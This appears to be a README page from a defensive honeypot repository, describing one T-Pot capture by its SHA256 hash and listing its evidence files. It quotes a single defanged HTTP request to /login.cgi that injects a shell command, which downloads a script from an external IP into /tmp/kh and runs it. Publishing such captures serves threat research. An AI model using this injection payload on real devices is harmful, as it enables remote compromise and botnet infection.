# a0b248dd85e7226f7e96a23d6c15085c349217f47e09afbeb1785f31c71922a1

High-signal T-Pot artifact published for human review.

## Summary

| Field | Value |
|---|---|
| SHA256 | `a0b248dd85e7226f7e96a23d6c15085c349217f47e09afbeb1785f31c71922a1` |
| Source | T-Pot / Oraculo SOC legacy review |
| Status | high-signal candidate |
| Evidence | commands, iocs, metadata |

## Why it is visible

This artifact matched useful defensive signals such as downloader behavior, command execution, IOC presence, metadata, or detection notes.

It is published here so the repository shows the actual observed volume instead of hiding everything behind a summary.

## Command preview

```text
GET /login.cgi?cli=aa%20aa%27;wget%20hxxp://109[.]104[.]153[.]XXX/sh%20-O%20-%3E%20/tmp/kh;sh%20/tmp/kh%27$ HTTP/1[.]1
```

## Evidence files

- `evidence/commands.defanged.txt`
- `evidence/iocs.defanged.json`
- `metadata/metadata.json`
- `detections.md`

Some files may be absent when the original artifact did not include that specific evidence type.

## Safety

Commands and IOCs are defanged for public defensive review. Do not execute captured payload material.
